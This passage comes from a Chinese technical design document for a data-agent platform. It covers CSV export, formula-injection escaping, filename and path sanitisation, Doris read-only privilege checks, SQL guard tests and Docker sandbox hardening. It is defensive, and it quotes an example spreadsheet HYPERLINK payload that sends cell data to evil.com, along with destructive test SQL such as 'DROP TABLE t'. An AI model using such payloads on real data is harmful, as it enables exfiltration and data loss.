        """流式执行查询并写入 CSV，同时保留字段统计与少量样例。"""
        writer = csv.writer(_Utf8Writer(temporary_file), lineterminator="\n")
        column_names: tuple[str, ...] | None = None
        column_stats: list[_ColumnStats] = []
        sample: list[dict[str, Any]] = []
        row_count = 0
        async with aclosing(
            self._query_repo.stream(sql, self._limits, self._options)
        ) as batches:
            async for batch in batches:
                if column_names is None:
                    column_names = batch.column_names
                    self._validate_column_names(column_names)
                    column_stats = [_ColumnStats() for _ in column_names]
                    writer.writerow(_csv_value(name) for name in column_names)
                elif batch.column_names != column_names:
                    # CSV 和返回 Schema 共用首批列定义，中途变形会使产物无法可靠解析。
                    raise QueryResultShapeError("流式查询各批次返回的列结构不一致")
                for row in batch.rows:
                    if len(row) != len(column_names):
                        raise QueryResultShapeError(
                            "查询结果行的列数与元数据声明不一致"
                        )
                    for stats, value in zip(column_stats, row, strict=True):
                        stats.observe(value)
                    writer.writerow(_csv_value(value) for value in row)
                    # 完整结果持续写入文件，内存只保留固定数量的可展示样例。
                    if len(sample) < self._options.sample_rows:
                        sample.append(
                            {
                                name: _summary_value(value)
                                for name, value in zip(column_names, row, strict=True)
                            }
                        )
                    row_count += 1
```

**内存占用是 O(1) 的**：`sample` 只保留 `sample_rows` 条（默认 5），`column_stats` 只有 N 个字段的统计对象，行数据写完即丢。

**列结构一致性检查是必须的**。CSV 表头只写一次（第一批的列名），如果后续批次列名变了（比如 Doris 在某些场景下会抖动），CSV 的行就和表头对不上，产物变成垃圾。所以这里直接报错而不是「凑合写」。

**`aclosing` 保证生成器被正确关闭**。`_query_repo.stream` 是一个异步生成器，它内部持有数据库游标。如果提前 break（比如上面抛了 `QueryResultShapeError`），不显式关闭的话游标不会释放，连接池会慢慢被占满。

**Schema 推断**：

```python
def _value_type(value: Any) -> str:
    """推断结果值的稳定 Schema 类型。"""
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, int):
        return "integer"
    if isinstance(value, Decimal):
        return "decimal"
    if isinstance(value, float):
        return "number"
    if isinstance(value, datetime):
        return "datetime"
    if isinstance(value, date):
        return "date"
    if isinstance(value, time):
        return "time"
    if isinstance(value, str):
        return "string"
    if isinstance(value, bytes):
        return "binary"
    if isinstance(value, (dict, list, tuple)):
        return "json"
    return type(value).__name__
```

**`bool` 必须在 `int` 之前判断**（Python 里 `isinstance(True, int)` 是 `True`），否则布尔值会被识别成整数。`datetime` 也要在 `date` 之前（`datetime` 是 `date` 的子类）。

跨行类型合并：

```python
def _merge_types(current: str | None, observed: str) -> str:
    """合并同一字段跨行观察到的运行时类型。"""
    if current is None or current == observed:
        return observed
    if {current, observed} <= {"integer", "decimal", "number"}:
        return "number"
    if {current, observed} <= {"date", "datetime"}:
        return "datetime"
    return "mixed"
```

数值类型之间可以合并成 `number`（因为 CSV 里都写成数字），日期时间合并成 `datetime`。其余组合直接标 `mixed`——这是**诚实**的做法，比强行猜一个类型好。

### 7.3.11 CSV 公式注入防护

这是一个容易被忽略的安全点。

```python
def _escape_csv_formula(value: str) -> str:
    """阻止电子表格把不可信字符串解释为公式。"""
    for character in value:
        if character.isspace() or unicodedata.category(character).startswith("C"):
            continue
        return f"'{value}" if character in "=+-@" else value
    return value
```

**攻击场景**：数据库里存了一个商品名 `=HYPERLINK("http://evil.com?data="&A1,"click")`。查询结果导出成 CSV，用户用 Excel 打开，这个单元格就被当公式执行了——数据会被外泄。

**防护逻辑**：

1. 跳过开头的空白字符和**控制字符**（`unicodedata.category` 以 `C` 开头的类别包括 `Cc` 控制字符、`Cf` 格式字符）。**为什么要跳过**：Excel 会忽略前导空白和控制字符，所以 `"\t=cmd"` 仍然会被当公式。必须找到**第一个可见字符**来判断。
2. 第一个可见字符如果是 `=` `+` `-` `@` 之一，就在整个字符串前面加一个单引号。Excel 会把 `'=...` 当纯文本。
3. 全是空白/控制字符的字符串直接返回。

### 7.3.12 产物文件名安全化

```python
def _query_artifact_filename(purpose: str) -> str:
    """将查询目的转换为安全、可辨识且不会覆盖旧产物的 CSV 文件名。"""
    normalized = unicodedata.normalize("NFKC", purpose).strip()
    stem_parts: list[str] = []
    separator_pending = False
    for character in normalized:
        if character.isalnum():
            if separator_pending and stem_parts:
                stem_parts.append("_")
            stem_parts.append(character)
            separator_pending = False
        else:
            separator_pending = True

    stem = "".join(stem_parts).rstrip("_") or "query_result"
    encoded_size = 0
    truncated: list[str] = []
    for character in stem:
        character_size = len(character.encode("utf-8"))
        if encoded_size + character_size > _QUERY_ARTIFACT_STEM_MAX_BYTES:
            break
        truncated.append(character)
        encoded_size += character_size
    safe_stem = "".join(truncated).rstrip("_") or "query_result"
    unique_suffix = uuid4().hex[:_QUERY_ARTIFACT_UNIQUE_SUFFIX_LENGTH]
    return f"{safe_stem}_{unique_suffix}.csv"
```

`purpose` 是**模型填的**（「取品类月度销售额」），所以要当不可信输入处理。四道处理：

1. **NFKC 归一化**。把兼容字符转成标准形式，防止用特殊 Unicode 字符绕过后续的字符过滤。
2. **只保留字母数字**，其余字符变成下划线分隔（连续非字母数字只产生一个下划线）。这样 `/` `..` `\0` 全被过滤掉，不可能产生路径穿越。
3. **按 UTF-8 字节数截断**，不是按字符数。因为文件系统限制的是字节长度（255 字节），中文一个字 3 字节。截断时按整字符截，不会把多字节字符切一半。
4. **加随机后缀**。这样同一个 purpose 反复执行不会覆盖旧产物（保留历史版本），也避免了不同会话的产物撞名。

**注意 `character.isalnum()` 对中文返回 True**，所以中文 purpose 会保留中文字符。这是刻意的——中文文件名对用户更友好。

### 7.3.13 执行期的资源限制与只读自检

```python
    @staticmethod
    async def _apply_session_limits(
        connection: AsyncConnection,
        limits: QueryExecutionLimits,
    ) -> None:
        """设置当前连接的 Doris 查询资源限制。"""
        await connection.execute(
            text(f"SET workload_group = '{limits.workload_group}'")
        )
        await connection.execute(text(f"SET query_timeout = {limits.timeout_seconds}"))
        await connection.execute(
            text(f"SET exec_mem_limit = {limits.memory_limit_bytes}")
        )
```

三条 `SET` 都作用在**当前连接**上。所以必须在取到连接后、执行 SQL 前设置。

| 设置 | 值 | 作用 |
| --- | --- | --- |
| `workload_group` | 角色的工作组 | 把查询归到指定的资源组，组间资源隔离 |
| `query_timeout` | 300 秒 | 单条查询超时，防止慢查询占着连接 |
| `exec_mem_limit` | 1 GB | 单条查询的内存上限，防止大聚合把 BE 打 OOM |

**注意 f-string 拼接**。这里没有用参数绑定，因为 Doris 的 `SET` 语句不支持参数绑定（MySQL 协议的限制）。所以 workload_group 的值必须先经过校验——它在 `verify_readonly_access` 里被正则校验过：

```python
        if re.fullmatch(DORIS_WORKLOAD_GROUP_PATTERN, workload_group) is None:
            raise ValueError("Doris Workload Group 标识无效")
```

**只读权限自检**（启动时和每次创建连接池时都会跑）：

```python
    @staticmethod
    def require_readonly_grants(
        rows: Sequence[Mapping[str, object]],
        expected_role: str,
    ) -> None:
        """校验 SHOW GRANTS 返回的当前账号合并权限。"""
        if not rows:
            raise DorisReadonlyPrivilegeError("Doris 查询账号未返回有效的授权信息")
        tokens: set[str] = set()
        for row in rows:
            privilege_values = [
                value
                for key, value in row.items()
                if key.casefold().endswith("privs") or "grant" in key.casefold()
            ]
            for value in privilege_values:
                if value is None:
                    continue
                tokens.update(
                    match.group(0).casefold()
                    for match in _PRIVILEGE_PATTERN.finditer(str(value))
                )
        forbidden = sorted(tokens - _ALLOWED_READONLY_PRIVILEGES)
        if forbidden:
            raise DorisReadonlyPrivilegeError(
                "Doris 查询账号包含禁止的非只读权限: " + ", ".join(forbidden)
            )
        if "select_priv" not in tokens and "read_only" not in tokens:
            raise DorisReadonlyPrivilegeError("Doris 查询账号缺少 SELECT_PRIV 只读权限")
        roles: set[str] = set()
        for row in rows:
            for key, value in row.items():
                if key.casefold() != "roles" or value is None:
                    continue
                roles.update(
                    role.strip().strip("'\"")
                    for role in re.split(r"[,;]", str(value))
                    if role.strip()
                )
        if roles != {expected_role}:
            raise DorisReadonlyPrivilegeError(
                "Doris 查询账号必须精确绑定到预期的唯一角色"
            )
```

**这是「守卫的守卫」**。前面 guard 在应用层校验 SQL，这里在数据库层校验账号本身的权限：

1. **权限集合必须是只读权限的子集**。如果查询账号被误授予了 `LOAD_PRIV`，即使 SQL 是只读的，也说明配置有问题——直接报错。
2. **必须有 SELECT_PRIV 或 READ_ONLY**。这是必要条件。
3. **角色必须精确等于预期的那一个**。用 `roles != {expected_role}` 而不是 `expected_role in roles`——要求**恰好一个**。如果查询账号被误加了第二个角色，权限可能被放大，必须报错。

**第 3 条是这套权限模型的关键保证**：它确保「一个 Doris 角色 ↔ 一个查询账号 ↔ 一份权限」这个映射不会被破坏。

### 7.3.14 执行审计与经验沉淀

**SQL 模板化与指纹**：

```python
def _build_sql_template(sql: str) -> tuple[str, str]:
    """将 SQL 字面量替换为参数并生成稳定结构指纹。"""
    expression = parse_one(sql, read="doris")
    parameter_index = 0
    for node in list(expression.walk()):
        if not isinstance(node, exp.Literal):
            continue
        parameter_index += 1
        node.replace(exp.Placeholder(this=f"p{parameter_index}"))
    template = expression.sql(dialect="doris", pretty=False)
    fingerprint = hashlib.sha256(template.encode()).hexdigest()
    return template, fingerprint
```

**把字面量替换成 `p1` / `p2` 占位符**，得到「SQL 结构」而不是「具体查询」。这样：

- `SELECT SUM(amount) FROM orders WHERE dt >= '2026-01-01'` 
- `SELECT SUM(amount) FROM orders WHERE dt >= '2026-09-01'`

两句话的**指纹相同**，会被聚合到同一条查询经验里。经验的内容是「查销售额要这样写」，而不是「查 1 月销售额的 SQL」。

**这是经验沉淀能起作用的前提**——否则每次不同的时间范围都会产生一条新经验，永远不会被复用。

**经验的键是「角色 + 指纹」**：

```python
        inserted_id = await self._session.scalar(statement)
        if inserted_id is None:
            existing = await self._session.scalar(
                select(QueryExperience)
                .where(
                    QueryExperience.role_name == experience.role_name,
                    QueryExperience.fingerprint == experience.fingerprint,
                )
                .with_for_update()
            )
```

**为什么按角色而不是按用户**：同一个 Doris 角色下的所有用户权限完全相同，SQL 经验可以共享。这样新用户上手时能直接复用老用户积累的经验。

**先 `on_conflict_do_nothing` 再 `with_for_update`**：先用插入尝试，冲突了再查出来加行锁更新。这样避免了「先查后插」的竞态。

**经验的状态机**：

```python
    def refresh_from_success(
        self,
        *,
        purpose: str,
        authorization_epoch: UUID,
        sql_template: str,
    ) -> bool:
        """更新同一角色和 SQL 结构的共享经验。"""
        if self.status == "deleting":
            return False
        if self.authorization_epoch != authorization_epoch:
            self.authorization_epoch = authorization_epoch
            self.purposes = [purpose]
```

- `deleting` 状态拒绝刷新（管理员删了就别再复活）。
- **授权代次变化时清空 purposes**。因为旧的 purpose 是在旧权限下记录的，可能引用无权字段。

`purposes` 是一个 JSON 列表，最多保留 5 个（`QUERY_EXPERIENCE_PURPOSE_LIMIT = 5`）。

**索引同步的版本控制**：

```python
                version=revision,
                version_type="external_gte",
                refresh="wait_for",
```

**`external_gte` 是 ES 的外部版本控制**：只有版本号 >= 当前版本才写入。这样旧任务（拿着旧 revision）的写入会被 ES 静默拒绝（抛 `ConflictError`，代码里忽略），不会覆盖新版本的数据。

**索引修复任务**：

```python
    async def list_pending_index_repairs(
        self,
        *,
        limit: int,
    ) -> dict[UUID, int]:
        """列出全部尚未同步到当前版本的查询经验。"""
        result = await self._session.execute(
            select(QueryExperience.id, QueryExperience.revision)
            .where(QueryExperience.indexed_revision < QueryExperience.revision)
            .order_by(QueryExperience.updated_at)
            .limit(limit)
        )
```

**`indexed_revision < revision` 就是「待同步」**。Beat 每 300 秒扫一批补投，兜住「任务提交失败」和「任务执行失败」两种情况。

`mark_indexes_synced` 按 `revision` 匹配（不是无条件写），所以旧任务的回写不会把新版本的 `indexed_revision` 覆盖掉。

### 7.3.15 经验召回

```python
        ranks: dict[UUID, float] = {}
        for hits in available_hits:
            for rank, hit in enumerate(hits, start=1):
                ranks[hit.item] = ranks.get(hit.item, 0) + 1 / (_RRF_K + rank)
        return _SemanticRecall(
            status="success" if len(available_hits) == 2 else "partial",
            ranks=ranks,
        )
```

和元数据召回用的是同一套 RRF。**两路都成功才是 `success`，一路成功是 `partial`，两路都失败是 `failed`**。

**召回后还要复核元数据版本**：

```python
            stale_ids = {
                experience.id
                for experience in experiences
                if experience.status == "active"
                and any(
                    current_versions.get(asset.resource_key) != asset.meta_version
                    for asset in experience.assets
                )
            }
```

**为什么召回时还要查一次**：经验在索引里，但索引可能滞后于元数据。经验关联的资产（表/字段）如果在元数据里被改过（版本变了），这条经验的 SQL 可能已经不对了。所以召回后要拿当前元数据版本复核一遍，不一致的**当场禁用**并投递索引同步。

这是「索引是缓存，数据库是真相」原则的体现——**从缓存拿结果，但用真相校验**。

## 7.4 测试

**没有单元测试目录**。但 `guard.py` 里有两个 `@staticmethod` 不依赖数据库，可以脱离环境验证。

### 7.4.1 验证只读规则（不需要任何服务）

```bash
uv run python -c "
from app.query.services.guard import QueryGuardService

for sql in [
    'SELECT a FROM t',
    'DROP TABLE t',
    'SELECT a FROM t; DROP TABLE t',
    'SELECT SLEEP(10) FROM t',
    'SELECT * FROM t WHERE a = 1',
]:
    expr, issues = QueryGuardService._parse_single_query(sql)
    codes = [i.code for i in issues]
    if expr is not None:
        codes += [i.code for i in QueryGuardService._check_readonly(expr)]
    print(f'{sql!r:45} -> {codes}')
"
```

预期输出（各条的错误码）：

| SQL | 预期错误码 |
| --- | --- |
| `SELECT a FROM t` | `[]`（通过） |
| `DROP TABLE t` | `['readonly_query_required']` |
| `SELECT a FROM t; DROP TABLE t` | `['multiple_statements']` |
| `SELECT SLEEP(10) FROM t` | `['forbidden_function']` |
| `SELECT * FROM t WHERE a = 1` | `[]`（只读检查通过，星号权限留给后续检查） |

**注意最后一条**：`_check_readonly` 只负责语法层面的只读，不管权限。`*` 是否放行要看 `_check_restricted_stars` 和 `_check_asset_policy`——它们需要元数据目录和授权策略，脱离环境跑不了。

### 7.4.2 验证函数白名单

```bash
uv run python -c "
import sqlglot
from app.query.services.guard import QueryGuardService

for sql in [
    'SELECT NOW() FROM t',
    'SELECT CURRENT_DATE FROM t',
    'SELECT SOME_UNKNOWN_FUNC(a) FROM t',
]:
    expr = sqlglot.parse_one(sql, read='doris')
    print(f'{sql!r:45} -> {[i.code for i in QueryGuardService._check_readonly(expr)]}')
"
```

预期：

| SQL | 预期 |
| --- | --- |
| `SELECT NOW() FROM t` | `[]`（在白名单里） |
| `SELECT CURRENT_DATE FROM t` | `[]` |
| `SELECT SOME_UNKNOWN_FUNC(a) FROM t` | `['unapproved_function']` |

**如果某个合法函数被误拒**，把它加进 `_SAFE_ANONYMOUS_FUNCTIONS` 即可。

### 7.4.3 验证 JOIN 规则

```bash
uv run python -c "
import sqlglot
from app.query.services.guard import QueryGuardService

for sql in [
    'SELECT * FROM a JOIN b ON a.id = b.a_id',
    'SELECT * FROM a CROSS JOIN b',
    'SELECT * FROM a JOIN b ON b.x = b.y',
    'SELECT * FROM a JOIN b ON a.id = b.a_id OR 1 = 1',
]:
    expr = sqlglot.parse_one(sql, read='doris')
    print(f'{sql!r:55} -> {[i.code for i in QueryGuardService._check_joins(expr)]}')
"
```

预期：

| SQL | 预期错误码 |
| --- | --- |
| `JOIN b ON a.id = b.a_id` | `[]` |
| `CROSS JOIN b` | `['cross_join_forbidden']` |
| `JOIN b ON b.x = b.y` | `['invalid_join_condition']` |
| `JOIN b ON a.id = b.a_id OR 1 = 1` | `['invalid_join_condition']` |

**最后一条是重点**——它验证了前面讲的 `OR` 用 `all` 的逻辑。`1 = 1` 这一侧既不属于 left 也不属于 right，`source_side` 返回 `None`，集合 `{"left", None}` 不等于 `{"left", "right"}`，所以报错。

### 7.4.4 端到端验证（需要完整环境）

走对话链路最直接——问一个取数问题，然后在 `meta` 库看执行记录：

```bash
docker exec -it postgres psql -U atguigu -d meta -c \
  "SELECT status, error_code, row_count, created_at
   FROM query_executions ORDER BY created_at DESC LIMIT 10;"
```

预期：`status` 是 `succeeded`（成功）或 `rejected`（被 guard 拒绝）。

**故意触发一次拒绝**：在对话里明确要求模型写一条写操作（比如「帮我把 orders 表清空」）。预期模型返回错误，`query_executions` 里出现 `status='rejected'`、`error_code='sql_validation_failed'` 的记录。

**验证经验沉淀**：

```bash
docker exec -it postgres psql -U atguigu -d meta -c \
  "SELECT role_name, LEFT(sql_template, 60) AS template, purposes, revision, indexed_revision
   FROM query_experiences ORDER BY updated_at DESC LIMIT 5;"
```

预期：能看到 `sql_template` 里的字面量已被替换成 `p1` / `p2`（这是模板化的直接证据），`purposes` 是问题摘要列表。

**验证索引同步**：

```bash
docker exec -it postgres psql -U atguigu -d meta -c \
  "SELECT count(*) FROM query_experiences WHERE indexed_revision < revision;"
```

预期：`0`。不为 0 说明 Worker 没跑或同步失败。

---

# 8. 沙箱隔离工作区（sandbox）

## 8.1 需求说明

Agent 要执行**模型生成的任意代码**。这些代码不能跑在宿主机上——它能读文件、能发网络请求、能 fork 进程。所以需要一个隔离环境。

但「隔离」这件事在这个项目里有额外的复杂度：**多个用户、多个会话共享同一台机器**，而且容器要能随时停、数据不能丢、多个进程（API + 多个 Worker）要能协调。

**能力清单**：

| 能力 | 谁在用 |
| --- | --- |
| 文件读写（`read_file` / `write_file` / `edit_file`） | Planner、Explorer、Analyst、Reviewer |
| Shell 执行（`shell`，含后台任务） | Planner（只读）、Explorer、Analyst、Reviewer |
| 产物落地（CSV / PNG / HTML） | 查询执行器、Analyst |
| 附件上传下载 | 对话附件接口 |
| 会话删除时回收目录 | 会话生命周期服务 |
| 用户注销时回收容器与数据卷 | 用户注销工作流 |

**核心约束**：

```
1. 运行时断网（network_mode: none）
   依赖必须在镜像构建期固化，运行期不能 pip install

2. 每用户一个容器 + 一个持久化数据卷
   容器可删、卷永存

3. 每个 Conversation / Session 独立 Linux UID
   同一容器内多会话共享文件系统，用 UID 做隔离

4. 跨进程协调
   API 与多个 Worker 可能同时操作同一用户的容器
```

## 8.2 代码组织规划

```
app/sandbox/
├── providers.py        create_sandbox_manager 工厂
├── exceptions.py       SandboxPathError / SandboxFileTooLargeError / SandboxDeletedError
│                       / SandboxCapacityError / SandboxCapacityUnavailableError
│                       / SandboxOwnershipError
├── paths.py            ★ 路径模型与校验（容器内根、工作区模板、只读挂载、Session 作用域）
├── manager.py          ★ 755 行，容器/卷生命周期、工作区准备、附件、空闲清理
├── backend.py          ★ 689 行，BaseSandbox 实现：文件与 Shell 落到容器 exec
├── archive.py          785 行，Docker Archive API 做持久工作区归档 + UID 注册表
├── ownership.py        ★ 504 行，Redis 分布式锁 + 租约 + 墓碑 + 活动时间
├── runtime_pool.py     163 行，启动容量、空闲停止/删除、关停收敛
├── scripts.py          424 行，注入容器内执行的受控脚本
└── shell_runner.py     354 行，长时 Shell Job 的启动/监控/取消
```

**对象关系**：

```
DockerSandboxManager（每进程一个，来自 app/providers.py）
   ├─ RedisSandboxOwnership      跨进程协调（锁/租约/墓碑）
   ├─ SandboxArchiveStore        UID 注册表 + 目录树 + 文件归档
   ├─ DockerRuntimePool          容器启动与回收
   └─ _get_or_create_storage_container_sync   容器创建
        │
        └─ 返回 DockerSandboxBackend（每次 get_backend 新建）
              ├─ _workspace_dir    当前会话的工作目录
              ├─ _execution_uid    当前会话的 Linux UID
              └─ _ownership.operation()   每次操作登记租约
```

**关键设计**：`DockerSandboxBackend` 是**每次调用新建的轻量对象**，它持有「我要在哪个目录、用哪个 UID 操作」的信息。真正的容器和卷由 `DockerSandboxManager` 管理（进程级单例）。

## 8.3 具体实现

### 8.3.1 容器内路径模型

```python
SANDBOX_DATA_ROOT = "/data"
SANDBOX_STAGING_ROOT = "/data/.dataagent-staging"
USER_ATTACHMENT_ROOT = "uploads"
_CONVERSATION_FILE_ROOTS = frozenset({"sessions", USER_ATTACHMENT_ROOT})
_PATH_MAX_BYTES = 4096
_PATH_COMPONENT_MAX_BYTES = 255


def conversation_workspace_path(conversation_id: UUID) -> str:
    """生成 Conversation 在容器中的完整工作目录。"""
    return posixpath.join(SANDBOX_DATA_ROOT, str(conversation_id))
```

三层路径：

```
/data                                          ← 数据卷挂载点
├── .dataagent-staging/                        ← 暂存区（root 持有，模型看不到）
│   └── <conversation_id>/<uid>/
├── <conversation_id>/                         ← Conversation 工作区
│   ├── .home / .cache / .tmp                  ← 每会话的工具目录
│   ├── uploads/                               ← 用户上传的附件
│   └── sessions/                              ← 专业 Agent Session 工作区
│       └── <analysis_id>/<agent_type>/<session_id>/
└── ...
```

**Session 工作区**：

```python
@dataclass(frozen=True, slots=True)
class SandboxSessionScope:
    """定位一个专业 Agent Session 工作区。"""

    analysis_id: str
    agent_type: str
    session_id: str

    def __post_init__(self) -> None:
        """校验 Agent Session 路径字段可安全用于工作区。"""
        for field_name, value in (
            ("analysis_id", self.analysis_id),
            ("agent_type", self.agent_type),
            ("session_id", self.session_id),
        ):
            if (
                not value
                or len(value.encode("utf-8")) > 64
                or not value[0].isalnum()
                or any(
                    not character.islower()
                    and not character.isdigit()
                    and character not in {"-", "_"}
                    for character in value
                )
            ):
                raise ValueError(f"沙箱 Session 字段无效: {field_name}")

    @property
    def relative_workspace(self) -> str:
        """生成 conversation 根目录下的 Session 路径。"""
        return f"sessions/{self.analysis_id}/{self.agent_type}/{self.session_id}"

    def registry_key(self, conversation_id: UUID) -> str:
        """生成 UID 注册表中的稳定 Session 键。"""
        return f"{conversation_id}/{self.relative_workspace}"

    def workspace_path(self, conversation_id: UUID) -> str:
        """生成 Session 在容器中的完整工作目录。"""
        return posixpath.join(
            conversation_workspace_path(conversation_id),
            self.relative_workspace,
        )
```

**字段校验非常严**：只允许小写字母、数字、`-`、`_`，首字符必须是字母数字，长度 ≤ 64 字节。

**为什么要这么严**：这三个字段是**模型填的**（`delegation` 工具的参数）。如果允许 `/` 或 `..`，模型就能把工作目录设成 `/data/../etc` 之类。虽然还有后续的路径校验，但在**构造路径模板的这一层就限制字符集**是最省事的做法——不合法的名字根本拼不出路径。

`app/shared/contracts/analysis.py` 里对同一组字段还有一层校验（`IDENTIFIER_PATTERN = ^[a-z0-9][a-z0-9_-]{0,63}$`），两处一致。

### 8.3.2 路径规范化与穿越防护

```python
def normalize_attachment_path(path: str) -> str:
    """校验并规范化会话内的附件相对路径。"""
    encoded_path = path.encode("utf-8", errors="surrogatepass")
    if (
        not path
        or path.startswith(("/", "~"))
        or "\\" in path
        or any(character == "\x7f" or ord(character) < 32 for character in path)
        or len(encoded_path) > _PATH_MAX_BYTES
    ):
        raise SandboxPathError(path)
    parts = PurePosixPath(path).parts
    if not parts or any(
        part in {"", ".", ".."}
        or len(part.encode("utf-8", errors="surrogatepass")) > _PATH_COMPONENT_MAX_BYTES
        for part in parts
    ):
        raise SandboxPathError(path)
    return PurePosixPath(*parts).as_posix()
```

拒绝清单：

| 拒绝什么 | 为什么 |
| --- | --- |
| 空路径 | 无意义 |
| 以 `/` 开头 | 附件必须是相对路径 |
| 以 `~` 开头 | shell 展开成 home 目录，绕过限制 |
| 含 `\` | Windows 路径分隔符，在 POSIX 环境里可能被误解 |
| 含控制字符（`< 32` 或 `\x7f`） | 可能被终端/日志/文件系统误解释 |
| 总长 > 4096 字节 | 超出文件系统限制 |
| 任一段是 `.` 或 `..` | **路径穿越** |
| 任一段 > 255 字节 | 单段文件名限制 |

**`..` 的检查在拆分后的每一段上做**，而不是检查整个字符串里有没有 `..`。因为 `..foo` 是合法文件名，`foo..bar` 也是。只有**恰好等于** `..` 的那一段才是穿越。

```python
def normalize_sandbox_path(path: str) -> str:
    """按容器 Shell 语义规范化相对路径或绝对路径。"""
    encoded_path = path.encode("utf-8", errors="surrogatepass")
    if (
        not path
        or path.startswith("~")
        or "\\" in path
        or any(character == "\x7f" or ord(character) < 32 for character in path)
        or len(encoded_path) > _PATH_MAX_BYTES
    ):
        raise SandboxPathError(path)
    normalized = posixpath.normpath(path)
    parts = PurePosixPath(normalized).parts
    if any(
        len(part.encode("utf-8", errors="surrogatepass")) > _PATH_COMPONENT_MAX_BYTES
        for part in parts
    ):
        raise SandboxPathError(path)
    return normalized
```

这个版本允许绝对路径（因为模型可以传容器内绝对路径），但用 `posixpath.normpath` 把 `..` 消解掉。比如 `/data/x/../../etc/passwd` 会被规范成 `/etc/passwd`——**规范化的结果再交给后续的边界检查**。

**注意这里的顺序**：先 normpath 消解，再做后续检查。不能先检查再 normpath，因为 `..` 在规范化前后位置不同。

```python
def conversation_relative_path(path: str, conversation_id: UUID) -> str:
    """将 Conversation 内的沙箱绝对路径转换为公开相对路径。"""
    normalized = normalize_sandbox_absolute_path(path)
    root = PurePosixPath(conversation_workspace_path(conversation_id))
    candidate = PurePosixPath(normalized)
    if not candidate.is_relative_to(root):
        raise SandboxPathError(path)
    relative = candidate.relative_to(root).as_posix()
    if not relative or PurePosixPath(relative).parts[0] not in _CONVERSATION_FILE_ROOTS:
        raise SandboxPathError(path)
    return relative
```

**两道边界检查**：

1. **必须在 Conversation 工作区内**（`is_relative_to(root)`）。防止跨会话访问别人的文件。
2. **第一段必须是 `sessions` 或 `uploads`**。防止访问 `.home` / `.cache` / `.tmp` 这些工具目录。

**用 `PurePosixPath.is_relative_to` 而不是字符串 `startswith`**。因为 `"/data/abc-evil".startswith("/data/abc")` 是 `True`，但 `abc-evil` 和 `abc` 是两个不同的目录。`is_relative_to` 按路径段比较，不会误判。

### 8.3.3 容器运行规格

```python
    def _runtime_container_spec(self) -> dict[str, Any]:
        """返回创建容器使用的完整运行规格。"""
        return {
            "command": ["sleep", "infinity"],
            "init": True,
            "read_only": True,
            "user": "1000:1000",
            "working_dir": SANDBOX_DATA_ROOT,
            "tmpfs": {"/tmp": "rw,nosuid,nodev,size=256m"},
            "cap_drop": ["ALL"],
            "security_opt": ["no-new-privileges:true"],
            "mem_limit": self._config.memory_limit,
            "nano_cpus": self._config.nano_cpus,
            "pids_limit": self._config.pids_limit,
            "network_mode": self._config.network_mode,
            "environment": {"HOME": "/tmp"},
        }
```

逐项解释：

| 配置 | 作用 |
| --- | --- |
| `command: ["sleep", "infinity"]` | 容器只是「活着等命令」，实际工作靠 `docker exec` |
| `init: True` | 注入一个 init 进程（tini），**回收僵尸进程**。Agent 会 fork 很多子进程，没有 init 会积累僵尸 |
| `read_only: True` | **根文件系统只读**。只有 `/data`（卷）和 `/tmp`（tmpfs）可写 |
| `user: "1000:1000"` | 默认非 root。与镜像里的 `sandbox` 用户一致 |
| `working_dir: /data` | 默认工作目录 |
| `tmpfs: /tmp` | `/tmp` 是内存文件系统，`nosuid` + `nodev` 防止通过它提权，限 256MB 防止写满内存 |
| `cap_drop: ["ALL"]` | **丢弃全部 Linux capabilities**。这是最关键的一条——没有 `CAP_NET_RAW` 就不能抓包，没有 `CAP_SYS_ADMIN` 就不能挂载 |
| `security_opt: no-new-privileges` | 禁止通过 setuid 程序提权 |
| `mem_limit` / `nano_cpus` / `pids_limit` | 资源限制，防止一个用户的代码把机器吃光 |
| `network_mode: none` | **运行时完全断网** |
| `HOME: /tmp` | 因为根文件系统只读，`HOME` 必须在可写位置 |

**`read_only: True` + `cap_drop: ALL` + `no-new-privileges` 三条组合起来，即使容器内的代码被完全控制，也几乎无法突破容器边界。**

### 8.3.4 容器规格摘要：什么时候重建容器

```python
    def _container_spec_digest(self, image_id: str) -> str:
        """计算完整容器运行和存储规格的稳定摘要。"""
        spec_payload = {
            "layout_version": 7,
            "image_id": image_id,
            "runtime": self._runtime_container_spec(),
            "workspace_mount": {
                "target": SANDBOX_DATA_ROOT,
                "mode": "rw",
            },
            "readonly_mounts": [
                {
                    "source": str(mount.source),
                    "target": mount.target.as_posix(),
                    "mode": "ro",
                }
                for mount in self._readonly_mounts
            ],
            "volume": {
                "driver": self._config.volume_driver,
                "driver_options": self._config.volume_driver_options,
                "quota_bytes": self._config.max_user_storage_bytes,
            },
        }
        return hashlib.sha256(
            json.dumps(spec_payload, sort_keys=True).encode()
        ).hexdigest()
```

**摘要涵盖**：镜像 ID、全部运行规格、工作区挂载、只读挂载、卷策略、`layout_version`。

`layout_version: 7` 是一个**手动维护的版本号**——目录布局变更时手动 +1，强制所有容器重建。

摘要存在容器的 label 里：

```python
            labels={
                **self._resource_labels(user_id),
                _CONTAINER_SPEC_LABEL: self._container_spec,
            },
```

下次取容器时比对：

```python
    def _get_or_create_storage_container_sync(self, user_id: int) -> Container:
        """获取或创建容器，但不启动容器。"""
        if user_id < 0:
            raise ValueError("user_id 不能为负数")
        name = self._container_name(user_id)
        container = self._get_existing_container_sync(user_id)
        if container is not None:
            if container.labels.get(_CONTAINER_SPEC_LABEL) == self._container_spec:
                return container
            logger.info(f"重建过期的 Docker 沙箱: user_id={user_id}")
            container.remove(force=True)
        try:
            return self._create_container(user_id)
        except APIError as exc:
            if exc.status_code != 409:
                raise
            existing_container = self._get_existing_container_sync(user_id)
            if existing_container is None:
                raise RuntimeError(f"Docker 容器创建发生并发冲突: {name}") from exc
            return existing_container
```

**摘要不一致就删掉重建**。这样改了内存限制、换了镜像、加了只读挂载，用户的容器会在下次访问时自动升级——不需要人工清理。

**409 冲突的处理**：两个进程同时创建同名容器时，一个会成功、另一个拿到 409。这里捕获 409 后**重新查找**而不是报错——因为那个容器是刚创建的、规格正确的。

**注意容器是「创建但不启动」**：

```python
    def _create_container(self, user_id: int) -> Container:
        """创建保持停止状态的用户容器。"""
        client = self._get_client()
        volume = self._get_or_create_volume(user_id)
        if self._container_spec is None:
            raise RuntimeError("Docker 沙箱容器配置不可用")

        container = client.containers.create(
            self._config.image,
            name=self._container_name(user_id),
            volumes={
                volume.name: {"bind": SANDBOX_DATA_ROOT, "mode": "rw"},
                **self._readonly_mount_volumes(),
            },
            labels={
                **self._resource_labels(user_id),
                _CONTAINER_SPEC_LABEL: self._container_spec,
            },
            **self._runtime_container_spec(),
